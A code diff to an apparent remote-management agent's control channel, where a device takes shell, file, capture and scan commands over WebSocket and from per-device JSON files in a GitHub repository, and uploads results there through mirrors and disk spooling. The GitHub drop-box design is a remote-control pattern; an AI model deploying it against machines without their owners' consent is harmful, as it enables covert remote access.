@@ -1,14 +1,11 @@
 """控制通道：WebSocket 与 GitHub 两条平行通道。
 
-两条通道地位对等：各自独立重连、独立暂存，都能下发命令与规则，
-也都能上报事件与结果。命令按 id 去重，避免两条通道同时送达时重复执行。
-设备本地控制台（devsrv.py）与局域网互联（mesh.py）都不依赖这两条通道。
+两通道地位对等：各自独立重连、独立暂存，命令按 id 去重。另提供两条上报通道：
+async send() 用于常规事件，flush_sync() 用于关机/退出时的同步兜底（会新开一条
+短连接发完即走，发不出去就落盘）。
 
-GitHub 通道的容错前提（国内网络经常连不上）：
-候选 URL 来自镜像池 mirrors.py（内置清单取自用户自己的 GitLink 项目），
-按健康度排序逐个尝试；抓不到新规则时用本地缓存 rules.remote.json；
-失败指数退避到 gh_backoff_max_s 并加随机抖动；遇到速率限制自动拉长间隔；
-上报失败写 spool.gh.jsonl，恢复后补齐；后台定期探测镜像并重新排序。
+GitHub 通道修复：以前只在拉到文件时才 flush，导致新建仓库（rules 与 cmd 都还没
+创建）永远不上报；现在每轮都尝试上报。
 """
 from __future__ import annotations
 
@@ -26,7 +23,7 @@ from .mirrors import MirrorPool
 SEND_TIMEOUT = 20
 MAX_WS_SIZE = 48 * 1024 * 1024
 DEDUP_MAX = 800
-GH_BATCH = 25
+GH_BATCH = 50
 GH_FETCH_TIMEOUT = 15
 
 
@@ -39,24 +36,23 @@ def _requests():
 
 
 def _bad_candidate(u: str) -> bool:
-    """排除“用 github.com 前缀拼接 raw/api 地址”这类无效组合。"""
     return "github.com/https://" in u or "github.com/http://" in u
 
 
 class ControlChannel:
-    """同时维护两条对等的外联通道。"""
-
     def __init__(self, cfg: Config,
                  on_message: Callable[[dict], Awaitable[dict | None]],
-                 on_rules: Callable[[dict, int], Awaitable[None]], log) -> None:
+                 on_rules: Callable[[dict, int], Awaitable[None]], log,
+                 version: str = "0.0.0") -> None:
         self.cfg = cfg
         self.on_message = on_message
         self.on_rules = on_rules
         self.log = log
+        self.version = version
         self.ws = None
         self._stop = asyncio.Event()
-        self._ws_q: asyncio.Queue[dict] = asyncio.Queue(maxsize=2000)
-        self._gh_q: asyncio.Queue[dict] = asyncio.Queue(maxsize=2000)
+        self._ws_q: asyncio.Queue[dict] = asyncio.Queue(maxsize=4000)
+        self._gh_q: asyncio.Queue[dict] = asyncio.Queue(maxsize=4000)
         self._seen: dict[str, float] = {}
         self._gh_rule_ver = -1
         self.gh_fails = 0
@@ -78,6 +74,16 @@ class ControlChannel:
             except asyncio.QueueFull:
                 self.log.warning("%s 通道队列已满，丢弃 type=%s", name, obj.get("type"))
 
+    def enqueue_sync(self, obj: dict) -> None:
+        """无事件循环的场景（如信号处理线程）也能入队。"""
+        for name, q in (("ws", self._ws_q), ("gh", self._gh_q)):
+            if not self.links[name]["enabled"]:
+                continue
+            try:
+                q.put_nowait(obj)
+            except Exception:
+                self._spool_append(name, obj)
+
     @property
     def online(self) -> bool:
         return bool(self.links["ws"]["connected"] or self.links["gh"]["connected"])
@@ -85,8 +91,11 @@ class ControlChannel:
     def status(self) -> dict:
         return {"ws": dict(self.links["ws"]), "gh": dict(self.links["gh"]),
                 "online": self.online, "gh_fails": self.gh_fails,
-                "last_mirror": self.last_mirror, "spool": self._spool_size(),
-                "mirrors": self.pool.status()}
+                "last_mirror": self.last_mirror, "queued": self.queued(),
+                "spool": self._spool_size(), "mirrors": self.pool.status()}
+
+    def queued(self) -> dict:
+        return {"ws": self._ws_q.qsize(), "gh": self._gh_q.qsize()}
 
     def _spool_path(self, name: str):
         return self.cfg.home_path / f"spool.{name}.jsonl"
@@ -142,9 +151,8 @@ class ControlChannel:
     # --- WebSocket 通道 ---
     async def _ws_loop(self) -> None:
         while not self._stop.is_set():
-            url = self._ws_url()
             try:
-                await self._ws_session(url)
+                await self._ws_session(self._ws_url())
             except asyncio.CancelledError:
                 raise
             except Exception as e:
@@ -188,8 +196,13 @@ class ControlChannel:
     async def _ws_writer(self, ws) -> None:
         while True:
             obj = await self._ws_q.get()
-            await asyncio.wait_for(ws.send(json.dumps(obj, ensure_ascii=False)), SEND_TIMEOUT)
-            self.links["ws"]["sent"] += 1
+            try:
+                await asyncio.wait_for(ws.send(json.dumps(obj, ensure_ascii=False)), SEND_TIMEOUT)
+                self.links["ws"]["sent"] += 1
+            except Exception as e:
+                # 发不出去不能丢：落盘，下次连上补发
+                self.log.debug("ws 发送失败，转存本地：%s", e)
+                self._spool_append("ws", obj)
 
     async def _heartbeat(self, ws) -> None:
         while True:
@@ -198,14 +211,14 @@ class ControlChannel:
 
     def hello(self) -> dict[str, Any]:
         return {"type": "hello", "device_id": self.cfg.device_id, "name": self.cfg.device_name,
-                "group": self.cfg.group, "ver": "1.3.0", "devconsole": self.cfg.devconsole_url,
+                "group": self.cfg.group, "ver": self.version, "devconsole": self.cfg.devconsole_url,
                 "mesh": {"group": self.cfg.mesh_scope, "port": int(self.cfg.mesh_port)},
                 "mirrors": self.pool.healthy(3),
                 "os": f"{platform.system()}-{platform.release()}", "host": platform.node(),
-                "caps": ["devconsole", "mesh", "desktop", "shell", "files", "capture", "scan", "git", "rules"],
+                "caps": ["devconsole", "mesh", "desktop", "shell", "files", "capture", "scan", "git", "rules", "report"],
                 "ts": int(time.time())}
 
-    # --- GitHub 通道（镜像池 + 缓存 + 退避） ---
+    # --- GitHub 通道 ---
     def _gh_try_urls(self, target: str) -> list[tuple[str, str]]:
         out: list[tuple[str, str]] = []
         for mid, u in self.pool.candidates(target, prefer=self.cfg.gh_proxy):
@@ -253,9 +266,8 @@ class ControlChannel:
     async def _gh_loop(self) -> None:
         cfg = self.cfg
         repo = cfg.gh_rules_repo.strip("/")
-        self.log.info("GitHub 通道已启动，仓库 %s，轮询 %ss，镜像池 %s 条（首选：%s）",
-                      repo, cfg.gh_poll_s, self.pool.status()["count"],
-                      (self.pool.status()["best"] or [{}])[0].get("id", "未知"))
+        self.log.info("GitHub 通道已启动，仓库 %s，轮询 %ss，镜像池 %s 条",
+                      repo, cfg.gh_poll_s, self.pool.status()["count"])
         await self._gh_load_cache()
         while not self._stop.is_set():
             ok = False
@@ -273,7 +285,7 @@ class ControlChannel:
                 self.log.debug("GitHub 通道异常：%s", e)
             if ok:
                 if self.gh_fails:
-                    self.log.info("GitHub 通道恢复正常（当前镜像 %s）", self.last_mirror or "直连")
+                    self.log.info("GitHub 通道恢复正常")
                 self.gh_fails = 0
                 self.links["gh"].update({"connected": True, "last_error": "", "fails": 0})
                 await asyncio.sleep(max(10, cfg.gh_poll_s))
@@ -281,9 +293,8 @@ class ControlChannel:
                 self.gh_fails += 1
                 self.links["gh"].update({"connected": False, "fails": self.gh_fails})
                 if self.gh_fails in (1, 5) or self.gh_fails % 10 == 0:
-                    self.log.warning("GitHub 通道不可达（连续 %s 次）：%s；已尝试镜像 %s；本地缓存规则仍生效",
-                                     self.gh_fails, self.links["gh"].get("last_error") or "网络不可达",
-                                     self.cfg.gh_mirror_top)
+                    self.log.warning("GitHub 通道不可达（连续 %s 次）：%s；本地缓存规则仍生效",
+                                     self.gh_fails, self.links["gh"].get("last_error") or "网络不可达")
                 await asyncio.sleep(self._gh_delay())
 
     def _gh_delay(self) -> float:
@@ -322,30 +333,30 @@ class ControlChannel:
         self.pool.probe(_getter, probe_url, max_mirrors=12)
 
     async def _gh_poll_once(self, req, repo: str) -> bool:
+        """修复点：不论是否拉到文件，每轮都尝试上报，否则新仓库永远不上报。"""
         cfg = self.cfg
+        fetched = False
         rules = await asyncio.to_thread(self._gh_fetch_json, req, f"{repo}/main/{cfg.gh_rules_path}")
-        touched = False
         if isinstance(rules, dict):
-            touched = True
+            fetched = True
             ver = int(rules.get("version") or 0)
             if ver != self._gh_rule_ver:
                 self._gh_rule_ver = ver
                 self.links["gh"]["recv"] += 1
                 self._gh_write_cache(rules)
                 await self.on_rules(rules, ver)
-                self.log.info("GitHub 通道加载规则 version=%s（来自 %s）", ver, self.last_mirror or "直连")
+                self.log.info("GitHub 通道加载规则 version=%s", ver)
         payload = await asyncio.to_thread(
             self._gh_fetch_json, req, f"{repo}/main/{cfg.gh_cmd_dir}/{cfg.device_id}.json")
         if isinstance(payload, dict):
-            touched = True
+            fetched = True
             for cmd in payload.get("commands") or []:
                 if isinstance(cmd, dict):
                     await self._inbound(cmd, "gh")
-        if touched:
-            await self._gh_flush(req, repo)
-        return touched
+        pushed = await self._gh_flush(req, repo)
+        return fetched or pushed
 
-    # --- 规则缓存：抓不到就用上一次的 ---
+    # --- 规则缓存 ---
     async def _gh_load_cache(self) -> None:
         p = self.cfg.rules_cache
         if not p.exists():
@@ -365,8 +376,8 @@ class ControlChannel:
         except Exception:
             pass
 
-    # --- 结果上报 ---
-    async def _gh_flush(self, req, repo: str) -> None:
+    # --- 上报 ---
+    def _collect_batch(self) -> list[dict]:
         batch: list[dict] = []
         spool = self._spool_path("gh")
         if spool.exists():
@@ -378,15 +389,26 @@ class ControlChannel:
             except Exception:
                 pass
         while len(batch) < GH_BATCH and not self._gh_q.empty():
-            batch.append(self._gh_q.get_nowait())
-        if not batch or not self.cfg.gh_token:
-            return
+            try:
+                batch.append(self._gh_q.get_nowait())
+            except Exception:
+                break
+        return batch
+
+    async def _gh_flush(self, req, repo: str) -> bool:
+        batch = self._collect_batch()
+        if not batch:
+            return True
+        if not self.cfg.gh_token:
+            self._spool_append("gh", batch)
+            return False
         path = f"{self.cfg.gh_outbox_dir}/{self.cfg.device_id}.jsonl"
         target = f"{self.cfg.gh_api_base.rstrip('/')}/repos/{repo}/contents/{path}"
         if await asyncio.to_thread(self._gh_append, req, target, batch):
             self.links["gh"]["sent"] += len(batch)
-        else:
-            self._spool_append("gh", batch)
+            return True
+        self._spool_append("gh", batch)
+        return False
 
     def _gh_append(self, req, target: str, batch: list[dict]) -> bool:
         for mid, url in self._gh_try_urls(target):
@@ -413,10 +435,69 @@ class ControlChannel:
                     self.pool.report(mid, True)
                     return True
                 self.pool.report(mid, False)
+                self.links["gh"]["last_error"] = f"HTTP {r.status_code}"
             except Exception as e:
                 self.pool.report(mid, False)
-                self.log.debug("GitHub outbox 写入失败：%s", e)
+                self.links["gh"]["last_error"] = str(e)
         return False
+
+    # --- 同步兜底（关机 / 退出） ---
+    async def emit_final(self, obj: dict) -> None:
+        await self.send(obj)
+
+    def flush_sync(self, extra: dict | None = None, timeout: float = 8.0) -> dict:
+        """同步把队列里的东西送出去：先试 WS 新连接，再试 GitHub，都不行就落盘。"""
+        result = {"items": 0, "ws": False, "gh": False}
+        batch: list[dict] = []
+        for q in (self._ws_q, self._gh_q):
+            while not q.empty():
+                try:
+                    batch.append(q.get_nowait())
+                except Exception:
+                    break
+        if extra:
+            batch.append(extra)
+        if not batch:
+            return result
+        result["items"] = len(batch)
+        if self.cfg.server_url:
+            result["ws"] = self._ws_send_blocking(batch, timeout)
+        if self.cfg.gh_rules_repo and self.cfg.gh_token:
+            req = _requests()
+            if req is not None:
+                batch = self._collect_batch() + batch
+                path = f"{self.cfg.gh_outbox_dir}/{self.cfg.device_id}.jsonl"
+                target = f"{self.cfg.gh_api_base.rstrip('/')}/repos/{self.cfg.gh_rules_repo}/contents/{path}"
+                result["gh"] = self._gh_append(req, target, batch[:GH_BATCH])
+        if not result["ws"]:
+            self._spool_append("ws", batch)
+        if not result["gh"]:
+            self._spool_append("gh", batch)
+        return result
+
+    def _ws_send_blocking(self, batch: list[dict], timeout: float = 8.0) -> bool:
+        import websockets  # type: ignore
+
+        url = self._ws_url()
+        if not url:
+            return False
+
+        async def _run() -> bool:
+            try:
+                async with websockets.connect(url, open_timeout=timeout,
+                                              close_timeout=2, ping_interval=None) as ws:
+                    for obj in batch:
+                        await ws.send(json.dumps(obj, ensure_ascii=False))
+                    return True
+            except Exception as e:
+                self.log.debug("关机上报走 WS 失败：%s", e)
+                return False
+
+        try:
+            return asyncio.run(asyncio.wait_for(_run(), timeout=timeout))
+        except Exception as e:
+            self.log.debug("关机上报 WS 异常：%s", e)
+            return False
 
     # --- 入站与去重 ---
     def _is_dup(self, obj: dict) -> bool:
@@ -472,9 +553,9 @@ class ControlChannel:
         except Exception:
             return
         q = self._ws_q if name == "ws" else self._gh_q
-        for line in lines[-1000:]:
+        for line in lines[-2000:]:
             try:
                 q.put_nowait(json.loads(line))
             except Exception:
                 continue
-        self.log.info("%s 通道补齐离线暂存 %s 条", name, min(len(lines), 1000))
+        self.log.info("%s 通道补齐离线暂存 %s 条", name, min(len(lines), 2000))
